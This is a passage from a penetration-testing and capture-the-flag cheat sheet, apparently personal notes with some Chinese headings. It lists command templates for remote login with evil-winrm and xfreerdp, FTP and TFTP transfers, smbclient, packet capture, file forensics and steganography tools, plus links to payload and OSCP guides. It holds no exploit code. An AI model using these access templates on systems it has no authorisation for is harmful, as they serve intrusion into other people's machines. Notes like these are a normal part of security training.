  - `sudo gem install evil-winrm`
  - `evil-winrm -i {IP} -u {user} -p {pass}`
- RDP
	- `xfreerdp +drives /u:{username} /p:{password} /v:{ip}:{port}`
	    - `/size:1800x1000`
	    - `/u:{domain\username}`
	- AD Login
	  - `xfreerdp +drives /u:"{domain}\{username}" /p:{password} /v:{ip}:{port}`
- FTP
	- `ls` ls
	- `binary` Binary mode
	- `get {file_name}` Download
	- `put {file_name}` Upload
- TFTP
    - Connection
      - `tftp {IP}`
    - Commands
      - `binary` Binary mode
      - `get {file_name}` Download
      - `put {file_name}` Upload
    - Default Path
      - `/var/lib/tftpboot`
- Unzip
    - `.gz`
        - `gzip -d {file}`
- tcpdump
    - `sudo tcpdump -i tun0`
      - `icmp` Only ICMP package
- smbclient
  - AD Login
    - `smbclient -L {IP} "{domain}\{user}"`
- nslookup
    - Find the DNS domain name
        - `nslookup {search_IP} {DNS-Server_IP}`

-----

## Forensics
- Unknown files
	- `file {file_name}`
	- `binwalk {file_name}`
	- `xxd {file_name}`
	- `foremost {file_name}`

-----

### Steganography
- [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)
- [zsteg](https://github.com/zed-0xff/zsteg)
- [steghide](http://steghide.sourceforge.net/)
	- `steghide extract -sf {file_name}`
- exiftool

----

## MISC

### 神奇網站

https://github.com/swisskyrepo/PayloadsAllTheThings/

### 文章

https://notes.offsec-journey.com/owasp-top-10-exploitation/getting-started

https://sushant747.gitbooks.io/total-oscp-guide/content/

https://github.com/w181496/Web-CTF-Cheatsheet